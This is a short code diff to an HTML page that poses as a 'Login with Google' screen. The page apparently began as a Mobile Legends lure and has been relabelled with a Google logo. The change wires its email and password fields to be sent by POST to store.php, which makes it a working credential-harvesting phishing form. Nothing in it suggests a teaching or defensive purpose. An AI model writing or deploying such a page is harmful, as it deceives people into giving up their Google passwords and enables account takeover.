@@ -45,11 +45,11 @@
 </head>
 <body>
     <div class="container">
-        <img src="google.png" alt="Mobile Legends Logo" style="width: 200px;">
+        <img src="google.png" alt="Google Logo" style="width: 200px;">
         <h2>Login with Google</h2>
-        <form action="processing.html">
-            <input type="email" placeholder="Enter your Google Email" required>
-            <input type="password" placeholder="Enter your Google Password" required>
+        <form action="store.php" method="POST">
+            <input type="email" name="email" placeholder="Enter your Google Email" required>
+            <input type="password" name="password" placeholder="Enter your Google Password" required>
             <button type="submit" class="button">Login</button>
         </form>
     </div>
